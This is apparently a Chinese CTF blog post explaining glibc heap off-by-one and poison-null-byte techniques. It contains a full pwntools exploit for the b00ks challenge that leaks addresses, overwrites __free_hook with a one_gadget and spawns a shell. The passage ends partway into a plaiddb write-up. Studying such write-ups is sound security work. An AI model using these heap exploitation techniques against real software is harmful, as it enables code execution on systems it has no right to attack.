@@ -1,0 +1,537 @@
+<!DOCTYPE html><html class="appearance-auto" lang="zh-cn"><head><meta charset="UTF-8"><title>DATAL's blog</title><meta name="description" content="my blogs about pwn"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="堆中的Off-By-One漏洞原理off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括
+
+使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节。
+字符串操作不合适
+
+利用思路
+溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法
+
+溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。
+ （1） 这时可以选择使用 unlink 方法进行处理。
+  （2） 另外，这时 prev_s.."><meta name="generator" content="Hexo 6.3.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">DATAL's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center"></p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">点击返回顶部</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E4%B8%AD%E7%9A%84Off-By-One"><span class="toc-text">堆中的Off-By-One</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E7%A4%BA%E4%BE%8B1"><span class="toc-text">思路示例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E7%A4%BA%E4%BE%8B2"><span class="toc-text">思路示例2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B-1-Asis-CTF-2016-b00ks"><span class="toc-text">实例 1: Asis CTF 2016 b00ks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-text">程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Create"><span class="toc-text">Create</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%A0%86%E6%8C%87%E9%92%88"><span class="toc-text">泄露堆指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc-off-by-one"><span class="toc-text">泄露libc(off-by-one)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E5%86%99free-hook%E4%B8%BAOGG"><span class="toc-text">覆写free_hook为OGG</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B-2-plaidctf-2015-plaiddb"><span class="toc-text">实例 2 : plaidctf 2015 plaiddb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1"><span class="toc-text">程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#getline%E8%AF%BB%E5%8F%96"><span class="toc-text">getline读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#put"><span class="toc-text">put</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-libc"><span class="toc-text">leak libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exploit-1"><span class="toc-text">exploit</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle"></h1><time class="has-text-grey" datetime="2023-05-29T08:57:55.224Z">2023-05-29</time><article class="mt-2 post-content"><h1 id="堆中的Off-By-One"><a href="#堆中的Off-By-One" class="headerlink" title="堆中的Off-By-One"></a>堆中的Off-By-One</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
+<ul>
+<li>使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节。</li>
+<li>字符串操作不合适</li>
+</ul>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
+<li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p>
+</li>
+<li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。</p>
+<p> （1） 这时可以选择使用 unlink 方法进行处理。</p>
+<p>  （2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。</p>
+</li>
+</ol>
+<pre><code>chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Size of previous chunk, if unallocated (P clear)  |
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Size of chunk, in bytes                     |A|M|P|
+  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             User data starts here...                          .
+        .                                                               .
+        .             (malloc_usable_size() bytes)                      .
+next    .                                                               |
+chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             (size of chunk, but used for application data)    |
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        |             Size of next chunk, in bytes                |A|0|1|
+        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+</code></pre>
+<ul>
+<li><em>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于。</em></li>
+<li><em>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</em></li>
+<li><em>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的P位都会被设置为1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</em></li>
+</ul>
+<p>&#x3D;&#x3D;最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。&#x3D;&#x3D;</p>
+<pre><code class="c_cpp">/* consolidate backward */
+    if (!prev_inuse(p)) &#123;
+      prevsize = prev_size (p);
+      size += prevsize;
+      p = chunk_at_offset(p, -((long) prevsize));
+      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */
+      if (__glibc_unlikely (chunksize(p) != prevsize))
+        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);
+      unlink_chunk (av, p);
+    &#125;
+</code></pre>
+<h3 id="思路示例1"><a href="#思路示例1" class="headerlink" title="思路示例1"></a>思路示例1</h3><p><strong>可以溢出任意字节</strong></p>
+<ol>
+<li><p>存在物理地址相连的四个chunk块a、b、c、d，chunk a存在off-by-one溢出时，我们可以将chunk b的size大小更改为chunk b的size加上chunk c的大小。</p>
+</li>
+<li><p><strong>free b</strong>时，chunk c的空间也会被一并归到chunk b的free chunk。</p>
+</li>
+<li><p>之后我们malloc一个合并起来size大小的chunk e，即**malloc(0x180-8)**，会发现我们对chunk e操作时，可以对overlap的chunk c进行操作，我们并未free c，所以我们可以随意更改原本不能操作的heap header</p>
+<img src="a359f0db2041768803ce13c694adf04f.png" alt="截图" style="zoom:50%;" />
+
+<hr>
+<pre><code>    ==这里有一个疑问，单字节溢出应该只溢出一个字节，为什么连prev_size都能覆盖，似乎溢出的是0x9个字节，而且malloc为什么不是0x180，还减去0x8？==
+</code></pre>
+<p><strong>这就是 ptmalloc 中 chunk 间的复用</strong></p>
+<p>当两个相邻的chunk在一起时，如果前一个chunk处于使用状态，那么后一个chunk的prev_size成员就不使用了，这些看上去似乎是一种浪费。因此，系统做了如下的规定：</p>
+</li>
+</ol>
+<p>当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的prev_size中存储。</p>
+<hr>
+<h3 id="思路示例2"><a href="#思路示例2" class="headerlink" title="思路示例2"></a>思路示例2</h3><p><strong>只能溢出0字节</strong>(<em>poison null byte</em>)</p>
+<ol>
+<li>存在物理地址相连的四个chunk块a、b、c、d，a存在溢出漏洞，b为被溢出chunk，<strong>free b</strong></li>
+<li>进行溢出，覆盖掉size最低字节为0，size从0x111-&gt;0x100，chunk被缩小，但next chunk c的prev_size仍为0x110——漏洞点</li>
+</ol>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/1685350457687d88c93d9d196a2b9485019cffe3a70c1.png"></p>
+<p>此时如果我们直接malloc(0x80)，会出现报错”corrupted size vs. prev_size”，这是因为unlink中加入了下述检查。</p>
+<pre><code class="c_cpp">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)
+if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);    
+</code></pre>
+<p>所以我们要在free b前布置一个fake chunk c，设置其<strong>prev_size &#x3D; 0x100</strong>,与溢出后的chun b大小一致。</p>
+<hr>
+<p>&#x3D;&#x3D;    但是这里malloc(0x80)为什么会触发unlink？这里实现的操作应该是从unsorted bins上切割下0x90的大小给b1，且malloc中能够触发unlink的情况只能在malloc_consolidate，这里没有fastbins明显不能触发，很疑惑。&#x3D;&#x3D;</p>
+<hr>
+<ol start="3">
+<li>malloc b1、b2，<strong>malloc(0x80);malloc(0x40)</strong>,malloc函数会从unsorted bins即chun b切割下0x90大小给b1，并设置reminder的状态以及其next chunk(fake chunk c)的prev_size为0x100-0x90 &#x3D; 0x70，b2同理，最终形成如下图第一列的结构，其中fake prev_size &#x3D; 0x20。</li>
+<li><strong>free(b1);free(c)</strong>,在free c时，根据c的prev_size为0x110进行chunk查找到了b1，发现其为free状态，出发unlink操作，最终得到了一块实际大小为0x1a0的unsorted bin，</li>
+<li><strong>malloc(0x190)</strong>,我们就获取这一整块0x190大小的控制权，其中包括了还未释放的b2。</li>
+</ol>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853504798668fdebb6b470db2433601a3fde1e7fc79.png"></p>
+<h2 id="实例-1-Asis-CTF-2016-b00ks"><a href="#实例-1-Asis-CTF-2016-b00ks" class="headerlink" title="实例 1: Asis CTF 2016 b00ks"></a>实例 1: Asis CTF 2016 b00ks</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>题目是一个常见的选单式程序，功能是一个图书管理系统。</p>
+<pre><code>1. Create a book
+2. Delete a book
+3. Edit a book
+4. Print book detail
+5. Change current author name
+6. Exit
+</code></pre>
+<p>程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息</p>
+<pre><code class="c_cpp">struct book
+&#123;
+    int id;
+    char *name;
+    char *description;
+    int size;
+&#125;
+struct book *book[20];
+</code></pre>
+<h4 id="Create"><a href="#Create" class="headerlink" title="Create"></a>Create</h4><p>book 结构中存在 name 和 description， 在堆上分配。</p>
+<p>首先分配 name buffer ，使用 malloc ，大小自定 。</p>
+<pre><code class="c_cpp">printf(&quot;\nEnter book name size: &quot;, *(_QWORD *)&amp;size);
+__isoc99_scanf(&quot;%d&quot;, &amp;size);
+printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;size);
+ptr = malloc(size);
+</code></pre>
+<p>之后分配 description ，同样大小自定。</p>
+<pre><code class="c_cpp">printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;size);
+        __isoc99_scanf(&quot;%d&quot;, &amp;size);
+v5 = malloc(size);
+</code></pre>
+<p>之后分配 book 结构的内存,固定大小0x20。</p>
+<pre><code class="c_cpp">book = malloc(0x20uLL);
+if ( book )
+&#123;
+    *((_DWORD *)book + 6) = size;
+    *((_QWORD *)off_202010 + v2) = book;
+    *((_QWORD *)book + 2) = description;
+    *((_QWORD *)book + 1) = name;
+    *(_DWORD *)book = ++unk_202024;
+    return 0LL;
+&#125;
+</code></pre>
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的</p>
+<pre><code class="c_cpp">signed __int64 __fastcall my_read(_BYTE *ptr, int number)
+&#123;
+  int i; // [rsp+14h] [rbp-Ch]
+  _BYTE *buf; // [rsp+18h] [rbp-8h]
+
+  if ( number &lt;= 0 )
+    return 0LL;
+  buf = ptr;
+  for ( i = 0; ; ++i )
+  &#123;
+    if ( (unsigned int)read(0, buf, 1uLL) != 1 )
+      return 1LL;
+    if ( *buf == &#39;\n&#39; )
+      break;
+    ++buf;
+    if ( i == number )
+      break;
+  &#125;
+  *buf = 0;
+  return 0LL;
+&#125;
+</code></pre>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="泄露堆指针"><a href="#泄露堆指针" class="headerlink" title="泄露堆指针"></a>泄露堆指针</h4><p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。</p>
+<p>通过ida和gdb的查看，我们发现author name后面紧接着的就是book[0]的地址，由此我们得到了book1_addr和book2_addr。</p>
+<pre><code class="text">0x555555756040: 0x6161616161616161  0x6161616161616161
+0x555555756050: 0x6161616161616161  0x6161616161616161   &lt;== author name
+0x555555756060: 0x0000555555757480 &lt;== pointer array    0x0000000000000000
+0x555555756070: 0x0000000000000000  0x0000000000000000
+0x555555756080: 0x0000000000000000  0x0000000000000000
+</code></pre>
+<pre><code class="python">  def leak_heap():
+    global book2_addr
+
+    io.sendlineafter(&quot;name: &quot;, &quot;A&quot; * 0x20)    #on this moment,don&#39;t overlap books,which is not constructed
+    Create(0xd0, &quot;AAAA&quot;, 0x20, &quot;AAAA&quot;)          # book1
+    Create(0x21000, &quot;AAAA&quot;, 0x21000, &quot;AAAA&quot;)    # book2
+
+    Print()
+    io.recvuntil(&quot;A&quot;*0x20)
+    book1_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))
+    book2_addr = book1_addr + 0x30
+
+    log.info(&quot;book2 address: 0x%x&quot; % book2_addr)
+</code></pre>
+<p>再上述操作后，heap构造如下图所示，</p>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/168535054484078efc3a831c59fd7a803b1dcba6cba65.png"></p>
+<h4 id="泄露libc-off-by-one"><a href="#泄露libc-off-by-one" class="headerlink" title="泄露libc(off-by-one)"></a>泄露libc(off-by-one)</h4><p>程序中同样提供了一种 change 功能， change 功能用于修改 author name ，所以通过 change 可以写入 author name ，利用 off-by-one 覆盖 pointer array 第一个项的低字节（book[0]的最低字节地址）。</p>
+<p>覆盖掉 book1 指针的低字节后，这个指针会指向 book1 的 description ，由于程序提供了 edit 功能可以任意修改 description 中的内容。我们可以提前在 description 中布置数据伪造成一个 book 结构，这个 book 结构的 description 和 name 指针可以由直接控制。</p>
+<pre><code class="python">def leak_libc():
+    global libc_base
+
+    fake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)
+    Edit(1, fake_book)
+    Change(&quot;A&quot; * 0x20)
+
+    Print()
+    io.recvuntil(&quot;Name: &quot;)
+    leak_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))
+    libc_base = leak_addr - 0x5ca010        # mmap_addr - libc_base
+
+    log.info(&quot;libc address: 0x%x&quot; % libc_base)
+</code></pre>
+<hr>
+<p>        这道题的巧妙之处在于在分配第二个 book 时，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。<strong>且 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址</strong>。</p>
+<pre><code class="text">Start              End                Offset             Perm Path
+0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/ 桌面 /123/123
+0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ 桌面 /123/123
+0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ 桌面 /123/123
+0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw-
+0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- &lt;========= mmap
+0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
+0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw-
+0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]
+0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]
+0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
+</code></pre>
+<hr>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853506230314c8602d8e412ca034a0bc20733b70693.png"></p>
+<h4 id="覆写free-hook为OGG"><a href="#覆写free-hook为OGG" class="headerlink" title="覆写free_hook为OGG"></a>覆写free_hook为OGG</h4><pre><code>    此时我们已经将book[0]的指针指向了fake book，所以我们能通过修改book[0]的description来控制fake book中description指针指向的区域。所以我们之前将fake book的description指向book2+8的位置，这样我们就能修改book2的name和description的指针，例如修改为**free_hook**的位置，从而套娃继续修改book2的description，也就是free_hook为我们的one_gadget。
+</code></pre>
+<pre><code class="python">def overwrite():
+    free_hook = libc.symbols[&#39;__free_hook&#39;] + libc_base
+    one_gadget = libc_base + 0x4527a
+
+    fake_book = p64(free_hook) * 2
+    Edit(1, fake_book)
+    fake_book = p64(one_gadget)
+    Edit(2, fake_book)
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16853506380337c880e328810e1a84b11ebaa7eb21279.png"></p>
+<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><pre><code class="python">#!/usr/bin/python
+#encoding:utf-8
+
+from pwn import *
+
+context.arch = &#39;amd64&#39;
+#context.log_level = &#39;debug&#39;
+
+fn = &#39;./b00ks&#39;
+elf = ELF(fn)
+libc = ELF(&#39;/home/datal/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#39;)
+
+debug = 0
+if debug:
+    io = remote(&#39;node4.buuoj.cn&#39;, 29198)
+
+else:
+    io = process(fn)
+def Create(nsize, name, dsize, desc):
+    io.sendlineafter(&quot;&gt; &quot;, &#39;1&#39;)
+    io.sendlineafter(&quot;name size: &quot;, str(nsize))
+    io.sendlineafter(&quot;name (Max 32 chars): &quot;, name)
+    io.sendlineafter(&quot;description size: &quot;, str(dsize))
+    io.sendlineafter(&quot;description: &quot;, desc)
+
+def Delete(idx):
+    io.sendlineafter(&quot;&gt; &quot;, &#39;2&#39;)
+    io.sendlineafter(&quot;delete: &quot;, str(idx))
+
+def Edit(idx, desc):
+    io.sendlineafter(&quot;&gt; &quot;, &#39;3&#39;)
+    io.sendlineafter(&quot;edit: &quot;, str(idx))
+    io.sendlineafter(&quot;description: &quot;, desc)
+
+def Print():
+    io.sendlineafter(&quot;&gt; &quot;, &#39;4&#39;)
+
+def Change(name):
+    io.sendlineafter(&quot;&gt; &quot;, &#39;5&#39;)
+    io.sendlineafter(&quot;name: &quot;, name)
+
+def leak_heap():
+    global book2_addr
+
+    io.sendlineafter(&quot;name: &quot;, &quot;A&quot; * 0x20)    #on this moment,don&#39;t overlap books,which is not constructed
+    Create(0xd0, &quot;AAAA&quot;, 0x20, &quot;AAAA&quot;)          # book1
+    Create(0x21000, &quot;AAAA&quot;, 0x21000, &quot;AAAA&quot;)    # book2
+
+    Print()
+    io.recvuntil(&quot;A&quot;*0x20)
+    book1_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))
+    book2_addr = book1_addr + 0x30
+
+    log.info(&quot;book2 address: 0x%x&quot; % book2_addr)
+
+
+def leak_libc():
+    global libc_base
+
+    fake_book = p64(1) + p64(book2_addr + 0x8) * 2 + p64(0x20)
+    Edit(1, fake_book)
+    Change(&quot;A&quot; * 0x20)
+
+    Print()
+    io.recvuntil(&quot;Name: &quot;)
+    leak_addr = u64(io.recvn(6).ljust(8, b&quot;\x00&quot;))
+    libc_base = leak_addr - 0x5ca010        # mmap_addr - libc_base
+
+    log.info(&quot;libc address: 0x%x&quot; % libc_base)
+&#39;&#39;&#39;
+0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+&#39;&#39;&#39;
+def overwrite():
+    free_hook = libc.symbols[&#39;__free_hook&#39;] + libc_base
+    one_gadget = libc_base + 0x4527a
+
+    fake_book = p64(free_hook) * 2
+    Edit(1, fake_book)
+    fake_book = p64(one_gadget)
+    Edit(2, fake_book)
+
+def pwn():
+    Delete(2)
+    io.interactive()
+
+if __name__ == &quot;__main__&quot;:
+    leak_heap()
+    leak_libc()
+    overwrite()
+    pwn()
+</code></pre>
+<h2 id="实例-2-plaidctf-2015-plaiddb"><a href="#实例-2-plaidctf-2015-plaiddb" class="headerlink" title="实例 2 : plaidctf 2015 plaiddb"></a>实例 2 : plaidctf 2015 plaiddb</h2><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>关键数据结构</p>
+<pre><code>struct Node &#123;
+    char *key;
+    long data_size;
+    char *data;
+    struct Node *left;
+    struct Node *right;
+    long dummy;
+    long dummy1;
+&#125;
+</code></pre>
+<h4 id="getline读取"><a href="#getline读取" class="headerlink" title="getline读取"></a>getline读取</h4><pre><code>char *__fastcall getline(__int64 a1, __int64 a2)
+&#123;
+  char *v2; // r12
+  char *v3; // rbx
+  size_t v4; // r14
+  char v5; // al
+  char v6; // bp
+  signed __int64 v7; // r13
+  char *v8; // rax
+
+  v2 = (char *)malloc(8uLL); // 一开始使用 malloc(8) 进行分配
+  v3 = v2;
+  v4 = malloc_usable_size(v2); // 计算了可用大小，例如对于 malloc(8) 来说，这里应该为24
+  while ( 1 )
+  &#123;
+    v5 = _IO_getc(stdin);
+    v6 = v5;
+    if ( v5 == -1 )
+      bye();
+    if ( v5 == 10 )
+      break;
+    v7 = v3 - v2;
+    if ( v4 &lt;= v3 - v2 )
+    &#123;
+      v8 = (char *)realloc(v2, 2 * v4); // 大小不够是将可用大小乘二，进行 realloc
+      v2 = v8;
+      if ( !v8 )
+      &#123;
+        puts(&quot;FATAL: Out of memory&quot;);
+        exit(-1);
+      &#125;
+      v3 = &amp;v8[v7];
+      v4 = malloc_usable_size(v8);
+    &#125;
+    *v3++ = v6; // &lt;--- 漏洞所在，此时 v3 作为索引，指向了下一个位置，如果位置全部使用完毕则会指向下一个本应该不可写位置 
+  &#125;
+  *v3 = 0; // &lt;--- 漏洞所在。 off by one （NULL 字节溢出）
+  return v2;
+&#125;
+</code></pre>
+<h4 id="put"><a href="#put" class="headerlink" title="put"></a>put</h4><pre><code>__int64 __fastcall cmd_put()
+&#123;
+  __int64 v0; // rsi
+  Node *row; // rbx
+  unsigned __int64 sz; // rax
+  char *v3; // rax
+  __int64 v4; // rbp
+  __int64 result; // rax
+  __int64 v6; // [rsp+0h] [rbp-38h]
+  unsigned __int64 v7; // [rsp+18h] [rbp-20h]
+
+  v7 = __readfsqword(0x28u);
+  row = (Node *)malloc(0x38uLL);
+  if ( !row )
+  &#123;
+    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);
+    exit(-1);
+  &#125;
+  puts(&quot;PROMPT: Enter row key:&quot;);
+  row-&gt;key = getline((__int64)&quot;PROMPT: Enter row key:&quot;, v0);
+  puts(&quot;PROMPT: Enter data size:&quot;);
+  gets_checked((char *)&amp;v6, 16LL);
+  sz = strtoul((const char *)&amp;v6, 0LL, 0);
+  row-&gt;data_size = sz;
+  v3 = (char *)malloc(sz);
+  row-&gt;data = v3;
+  if ( v3 )
+  &#123;
+    puts(&quot;PROMPT: Enter data:&quot;);
+    fread_checked(row-&gt;data, row-&gt;data_size);
+    v4 = insert_node(row);
+    if ( v4 )
+    &#123;
+      free(row-&gt;key);
+      free(*(void **)(v4 + 16));
+      *(_QWORD *)(v4 + 8) = row-&gt;data_size;
+      *(_QWORD *)(v4 + 16) = row-&gt;data;
+      free(row);
+      puts(&quot;INFO: Update successful.&quot;);
+    &#125;
+    else
+    &#123;
+      puts(&quot;INFO: Insert successful.&quot;);
+    &#125;
+    result = __readfsqword(0x28u) ^ v7;
+  &#125;
+  else
+  &#123;
+    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);
+    free(row-&gt;key);
+    free(row);
+  &#125;
+  return result;
+&#125;
+</code></pre>
+<p>分配过程：</p>
+<ol>
+<li>malloc(0x38) (结构体)</li>
+<li>getline (malloc 和 realloc)</li>
+<li>malloc(size) 可控大小</li>
+<li>读入 size 字节内容</li>
+</ol>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>这里创建了连续的大小为0x80,0x110,0x90,0x90。</p>
